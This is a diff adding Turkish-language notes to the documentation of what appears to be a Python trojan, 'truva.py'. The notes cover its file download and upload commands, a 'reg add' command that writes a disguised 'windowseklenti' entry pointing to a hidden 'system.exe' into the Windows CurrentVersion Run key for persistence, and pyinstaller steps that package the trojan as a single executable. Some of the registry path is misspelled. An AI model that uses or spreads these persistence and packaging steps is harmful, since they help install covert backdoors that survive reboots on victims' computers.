@@ -30,6 +30,17 @@ paketleme
 pip install simplejson
 dosyalar arasi gezinmek için
 cd ve cd path(örn cd ..)
-
-
+dosya indirmek için indir file_path
+dosya yüklemek için yükle file_path upload_path
+çökmesini engelmmek için try except blokları eklendi
+sisteme yerleşme için:
+regedit (kayıt defteri düzenleyicisi) :HYKEY_Curren USer sofware microsoft windows CurrentVersion Run içine gelip
+yeni diyip bir değer kaydedebilriiz fakat bunu kod üzerinden yapıcaz biz. bunu için
+cmd içinde reg add dosya_yolu(CurrentVersion->Run içi) /v windowseklenti(isim) /t REG_SZ(türü) /d "C:\users\IEUser\AppData\system.exe"(programın yolu)
+bunu biz kodlama üzerinden  yapıcaz.
+exe çevirmek için
+pip instal pyinstaller
+pyinstaller truva.py --onefile  -> exe dosyasına çevirir. --onefile bütün importları tek sayfada birleştirir.
+kullanım:
+yerles windowseklenti(isimver gpeditde gözükecek)
 
